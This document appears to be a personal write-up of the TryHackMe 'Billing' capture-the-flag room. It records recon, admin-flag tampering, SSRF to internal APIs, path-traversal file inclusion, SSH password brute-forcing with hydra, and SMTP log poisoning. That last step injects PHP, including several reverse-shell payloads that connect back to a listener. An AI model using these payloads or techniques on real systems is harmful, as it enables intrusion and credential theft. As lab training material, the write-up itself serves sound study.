# **Medium - Use your server exploitation skills to take control of a web app.**
https://tryhackme.com/room/billing

This challenge is an initial test to evaluate your capabilities in web pentesting, particularly for server-side attacks. Start the VM by clicking the `Start Machine` button at the top right of the task.

You will find all the necessary tools to complete the challenge, like Nmap, PHP shells, and many more on the AttackBox.  

_"Even if it's not accessible from the browser, can you still find a way to capture the flags and sneak into the secret admin panel?"_

# Reconnaissance
Target: 10.10.41.124

## Open services
```
sudo nmap -sV 10.10.41.124 
[sudo] password for kali: 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-03-10 00:00 EDT
Nmap scan report for 10.10.41.124
Host is up (0.28s latency).
Not shown: 992 closed tcp ports (reset)
PORT      STATE SERVICE  VERSION
22/tcp    open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
25/tcp    open  smtp     Postfix smtpd
110/tcp   open  pop3     Dovecot pop3d
143/tcp   open  imap     Dovecot imapd (Ubuntu)
993/tcp   open  ssl/imap Dovecot imapd (Ubuntu)
995/tcp   open  ssl/pop3 Dovecot pop3d
4000/tcp  open  http     Node.js (Express middleware)
50000/tcp open  http     Apache httpd 2.4.41 ((Ubuntu))
Service Info: Host:  mail.filepath.lab; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 40.21 seconds

```

# Findings 

## Initial findings 
- Mail server? 
- SSH
- http://10.10.41.124:4000/
- http://10.10.41.124:50000/

## First flag findings 
- logging in with guest and guest, opening guest profile page looks like we get the values like isAdmin: false and a area to update settings like favorite book, can we use this call to update the admin? http://10.10.41.124:4000/friend/1
- Banner page has a upload image
## Second flag findings 
- Possible LFI with path traversal? http://10.10.41.124:50000/profile.php?img=profile.png 
# Exploiting

Testing finding with isAdmin on guest profile page, 
```
Recommend an Activity to guest
Activity Type (e.g., Favorite Book) = isAdmin
Activity Name (e.g., 1984) = True
```

Looks like this works, refreshing page now gives a new API menu  http://10.10.41.124:4000/admin/api

```
Below is a list of important APIs accessible to admins with sample requests and responses:

    Internal API

    GET http://127.0.0.1:5000/internal-api HTTP/1.1
    Host: 127.0.0.1:5000

    Response:
    {
      "secretKey": "superSecretKey123",
      "confidentialInfo": "This is very confidential."
    }

    Get Admins API

    GET http://127.0.0.1:5000/getAllAdmins101099991 HTTP/1.1
    Host: 127.0.0.1:5000

    Response:
    {
        "ReviewAppUsername": "admin",
        "ReviewAppPassword": "xxxxxx",
        "SysMonAppUsername": "administrator",
        "SysMonAppPassword": "xxxxxxxxx",
    }

```

Can't access externally, looks like we need to find a way to open internally, 
- http://10.10.41.124:5000/internal-api
- http://10.10.41.124:50000/internal-api
- http://10.10.41.124:4000/internal-api

Maybe image upload within http://10.10.41.124:4000/admin/settings ?

```
http://127.0.0.1:5000/internal-api

Response
data:application/json; charset=utf-8;base64,eyJzZWNyZXRLZXkiOiJzdXBlclNlY3JldEtleTEyMyIsImNvbmZpZGVudGlhbEluZm8iOiJUaGlzIGlzIHZlcnkgY29uZmlkZW50aWFsIGluZm9ybWF0aW9uLiBIYW5kbGUgd2l0aCBjYXJlLiJ9

Base64 decode
{"secretKey":"superSecretKey123","confidentialInfo":"This is very confidential information. Handle with care."}
```

```
http://127.0.0.1:5000/getAllAdmins101099991

Response
data:application/json; charset=utf-8;base64,eyJSZXZpZXdBcHBVc2VybmFtZSI6ImFkbWluIiwiUmV2aWV3QXBwUGFzc3dvcmQiOiJhZG1pbkAhISEiLCJTeXNNb25BcHBVc2VybmFtZSI6ImFkbWluaXN0cmF0b3IiLCJTeXNNb25BcHBQYXNzd29yZCI6IlMkOSRxazZkIyoqTFFVIn0=

Base64 decode
{"ReviewAppUsername":"admin","ReviewAppPassword":"############","SysMonAppUsername":"administrator","SysMonAppPassword":"############"}
```

### What is the flag value after logging in to the SysMon app?
We can now login into http://10.10.41.124:50000/ with the SysMonAppUsername credentials captured within the API call and the flag is shown. Note I have removed the passwords and you will need to run the API call to obtain. 



testing the findings of possible LFI
```
wget https://raw.githubusercontent.com/danielmiessler/SecLists/refs/heads/master/Fuzzing/LFI/LFI-Jhaddix.txt
```

```
wfuzz -c -z file,LFI-Jhaddix.txt --hc 404 --hl 0 -H "Cookie: PHPSESSID=31btcd0pvfvkehu4gm7cc7ocvk" http://10.10.41.124:50000/profile.php?img=FUZZ

********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://10.10.41.124:50000/profile.php?img=FUZZ
Total requests: 929

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                       
=====================================================================

000000340:   200        41 L     60 W       2231 Ch     "....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//...
                                                        .//etc/passwd"                                                                                
000000347:   200        41 L     60 W       2231 Ch     "....//....//....//....//....//....//....//....//....//etc/passwd"                            
000000346:   200        41 L     60 W       2231 Ch     "....//....//....//....//....//....//....//....//....//....//etc/passwd"                      
000000345:   200        41 L     60 W       2231 Ch     "....//....//....//....//....//....//....//....//....//....//....//etc/passwd"                
000000344:   200        41 L     60 W       2231 Ch     "....//....//....//....//....//....//....//....//....//....//....//....//etc/passwd"          
000000343:   200        41 L     60 W       2231 Ch     "....//....//....//....//....//....//....//....//....//....//....//....//....//etc/passwd"    
000000342:   200        41 L     60 W       2231 Ch     "....//....//....//....//....//....//....//....//....//....//....//....//....//....//etc/passw
                                                        d"                                                                                            
000000339:   200        41 L     60 W       2231 Ch     "....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//...
                                                        .//....//etc/passwd"                                                                          
000000341:   200        41 L     60 W       2231 Ch     "....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//etc
                                                        /passwd"                                                                                      
000000338:   200        41 L     60 W       2231 Ch     "....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//...
                                                        .//....//....//etc/passwd"                                                                    
000000337:   200        41 L     60 W       2231 Ch     "....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//...
                                                        .//....//....//....//etc/passwd"                                                              
000000335:   200        41 L     60 W       2231 Ch     "....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//...
                                                        .//....//....//....//....//....//etc/passwd"                                                  
000000336:   200        41 L     60 W       2231 Ch     "....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//...
                                                        .//....//....//....//....//etc/passwd"                                                        
000000334:   200        41 L     60 W       2231 Ch     "....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//...
                                                        .//....//....//....//....//....//....//etc/passwd"                                            

Total time: 26.08146
Processed Requests: 929
Filtered Requests: 915
Requests/sec.: 35.61916

```

Nice we can open the passwd but don't have access to the shadow file 
http://10.10.41.124:50000/profile.php?img=....//....//....//....//....//....//....//....//....//etc/passwd

```
root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin messagebus:x:103:106::/nonexistent:/usr/sbin/nologin syslog:x:104:110::/home/syslog:/usr/sbin/nologin _apt:x:105:65534::/nonexistent:/usr/sbin/nologin tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin sshd:x:109:65534::/run/sshd:/usr/sbin/nologin landscape:x:110:115::/var/lib/landscape:/usr/sbin/nologin pollinate:x:111:1::/var/cache/pollinate:/bin/false ec2-instance-connect:x:112:65534::/nonexistent:/usr/sbin/nologin systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin ubuntu:x:1000:1000:Ubuntu:/home/ubuntu:/bin/bash lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false tryhackme:x:1001:1001:,,,:/home/tryhackme:/bin/bash mysql:x:113:119:MySQL Server,,,:/nonexistent:/bin/false postfix:x:114:121::/var/spool/postfix:/usr/sbin/nologin dovecot:x:115:123:Dovecot mail server,,,:/usr/lib/dovecot:/usr/sbin/nologin dovenull:x:116:124:Dovecot login user,,,:/nonexistent:/usr/sbin/nologin joshua:x:1002:1002:,,,:/home/joshua:/bin/bash charles:x:1003:1003:,,,:/home/charles:/bin/bash 
```

Attempting to LFI flag file is a dead end,
- http://10.10.41.124:50000/profile.php?img=...//....//....//....//....//....//var/www/html/root.txt  
- http://10.10.41.124:50000/profile.php?img=...//....//....//....//....//....//var/www/html/flag.txt

Can we hydra found users? 

```
hydra -l joshua -P /usr/share/wordlists/rockyou.txt 10.10.41.124 ssh
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-03-10 00:54:20
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking ssh://10.10.41.124:22/
[22][ssh] host: 10.10.41.124   login: joshua   password: #######
1 of 1 target successfully completed, 1 valid password found
[WARNING] Writing restore file because 2 final worker threads did not complete until end.
[ERROR] 2 targets did not resolve or could not be connected
[ERROR] 0 target did not complete
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-03-10 00:54:28

hydra -l charles -P /usr/share/wordlists/rockyou.txt 10.10.41.124 ssh
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-03-10 00:55:01
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking ssh://10.10.41.124:22/
[22][ssh] host: 10.10.41.124   login: charles   password: #######
1 of 1 target successfully completed, 1 valid password found
[WARNING] Writing restore file because 1 final worker threads did not complete until end.
[ERROR] 1 target did not resolve or could not be connected
[ERROR] 0 target did not complete
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-03-10 00:55:09


```

### What is the content of the hidden text file in /var/www/html?

Connecting with the found credentials we can cat the txt file with /var/www/html, the random file name shows why we couldn't LFI it.
```
ssh joshua@10.10.41.124
The authenticity of host '10.10.41.124 (10.10.41.124)' can't be established.
ED25519 key fingerprint is SHA256:MoomXp4rsuf8BFoIra85Qbp/ZBq+favBmSFsi6kkVCk.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.41.124' (ED25519) to the list of known hosts.
joshua@10.10.41.124's password: 
Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.15.0-1055-aws x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Mon Mar 10 04:57:38 UTC 2025

  System load:  0.24              Processes:             166
  Usage of /:   8.4% of 58.09GB   Users logged in:       0
  Memory usage: 21%               IPv4 address for eth0: 10.10.41.124
  Swap usage:   0%

 * Ubuntu Pro delivers the most comprehensive open source security and
   compliance features.

   https://ubuntu.com/aws/pro

98 updates can be applied immediately.
1 of these updates is a standard security update.
To see these additional updates run: apt list --upgradable


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


1 updates could not be installed automatically. For more details,
see /var/log/unattended-upgrades/unattended-upgrades.log

joshua@filepath:~$ cd /var/www/html
joshua@filepath:/var/www/html$ ls
505eb0fb8a9f32853b4d955e1f9123ea.txt  api.php  auth.php  dashboard.php  index.php  login.php  logout.php  profile.php  templates  uploads
joshua@filepath:/var/www/html$ cat 505eb0fb8a9f32853b4d955e1f9123ea.txt 
THM{#####################}

```

# Bonus round, what about that SMTP server? 

We can LFI the mail server logs? yes we can

http://10.10.41.124:50000/profile.php?img=....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//var/log/mail.log

Can we cause entries with in this log

```
echo -e "EHLO example.com\nMAIL FROM:<test@email.com>\nRCPT TO:<test@email.com>\nDATA\nSubject: Test\n\nTest message.\n.\nQUIT\n" | nc 10.10.41.124 25

220 mail.filepath.lab ESMTP Postfix (Ubuntu)
250-mail.filepath.lab
250-PIPELINING
250-SIZE 10240000
250-VRFY
250-ETRN
250-STARTTLS
250-ENHANCEDSTATUSCODES
250-8BITMIME
250-DSN
250-SMTPUTF8
250 CHUNKING
250 2.1.0 Ok
250 2.1.5 Ok
354 End data with <CR><LF>.<CR><LF>
250 2.0.0 Ok: queued as 9D546FB215
221 2.0.0 Bye

```

Yes we can 
```
Mar 10 04:00:21 mail dovecot: pop3-login: Disconnected (no auth attempts in 7 secs): user=<>, rip=10.4.114.252, lip=10.10.41.124, TLS, session= Mar 10 05:10:58 mail postfix/smtpd[3471]: connect from ip-10-4-114-252.eu-west-1.compute.internal[10.4.114.252] Mar 10 05:10:58 mail postfix/smtpd[3471]: improper command pipelining after EHLO from ip-10-4-114-252.eu-west-1.compute.internal[10.4.114.252]: MAIL FROM:\nRCPT TO:\nDATA\nSubject: Test\n\nTest message.\n.\nQUIT\n\n Mar 10 05:10:58 mail postfix/smtpd[3471]: 9D546FB215: client=ip-10-4-114-252.eu-west-1.compute.internal[10.4.114.252] Mar 10 05:10:58 mail postfix/cleanup[3474]: 9D546FB215: message-id=<> Mar 10 05:10:58 mail postfix/smtpd[3471]: disconnect from ip-10-4-114-252.eu-west-1.compute.internal[10.4.114.252] ehlo=1 mail=1 rcpt=1 data=1 quit=1 commands=5 Mar 10 05:10:58 mail postfix/qmgr[1720]: 9D546FB215: from=, size=242, nrcpt=1 (queue active) Mar 10 05:11:28 mail postfix/smtp[3475]: connect to mx01.mail.com[74.208.5.22]:25: Connection timed out
```

Bit of testing we should be able to use the following to list all files within the directory 
```
<?php echo implode(PHP_EOL, scandir('/var/www/html')); ?>
```

Trying the following to get the PHP into the log file, 

```
nc 10.10.85.15 25
220 mail.filepath.lab ESMTP Postfix (Ubuntu)
EHLO attacker.com
250-mail.filepath.lab
250-PIPELINING
250-SIZE 10240000
250-VRFY
250-ETRN
250-STARTTLS
250-ENHANCEDSTATUSCODES
250-8BITMIME
250-DSN
250-SMTPUTF8
250 CHUNKING
MAIL FROM:<attacker@evil.com>
250 2.1.0 Ok
RCPT TO:<<?php echo implode(PHP_EOL, scandir('/var/www/html')); ?>>
550 5.1.1 <?phpechoimplode;?>: Recipient address rejected: User unknown in local recipient table
DATA
554 5.5.1 Error: no valid recipients
Subject: <?php echo implode(PHP_EOL, scandir('/var/www/html')); ?>
221 2.7.0 Error: I can break rules, too. Goodbye.
```

Checking the mail.log and we can see the files from the directory listed,
http://10.10.85.15:50000/profile.php?img=....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//var/log/mail.log

```
550 5.1.1 : Recipient address rejected: User unknown in local recipient table; from= to= proto=ESMTP helo= Mar 10 06:17:21 mail postfix/smtpd[2101]: warning: non-SMTP command from ip-10-10-249-90.eu-west-1.compute.internal[10.10.249.90]: Subject: . .. .htaccess 505eb0fb8a9f32853b4d955e1f9123ea.txt api.php auth.php dashboard.php index.php login.php logout.php profile.php templates uploadsMar 10 06:17:21 mail postfix/smtpd[2101]: disconnect from ip-10-10-249-90.eu-west-1.compute.internal[10.10.249.90] ehlo=2 mail=2 rcpt=1/3 data=1/2 unknown=0/1 commands=6/10 
```

So now we can LFI the flag without even connecting via SSH 
http://10.10.85.15:50000/profile.php?img=....//....//....//....//....//....//....//....//....//var/www/html/505eb0fb8a9f32853b4d955e1f9123ea.txt

```
THM{#######################} 
```

Further testing, it's the subject line that gets injected into the log, can we get a reverse shell ?  yes and no, can get connections but they drop straight away. Attempted to use msfconsole and listeners such as exploit/multi/handler  PAYLOAD php/meterpreter/reverse_tcp but unfortunately didn't work.  Might revisit another time

```
Subject: <?php $sock=fsockopen("10.10.249.90",8997);system("/bin/sh -i <&3 >&3 2>&3");?>
Subject: <?php $sock=fsockopen("10.10.249.90",8998);shell_exec("/bin/sh -i <&3 >&3 2>&3");?>
Subject: <?php $sock=fsockopen("10.10.249.90",8999);popen("/bin/sh -i <&3 >&3 2>&3", "r");?>
Subject: <?php $sock=fsockopen("10.10.249.90",9001);exec("/bin/sh -i <&3 >&3 2>&3");?>
Subject: <?php $sock=fsockopen("10.10.249.90",9000);exec("/bin/sh -i <&3 >&3 2>&3");?>

root@ip-10-10-249-90:~# nc -lvnp 9001
Listening on 0.0.0.0 9001
Connection received on 10.10.150.130 44478
```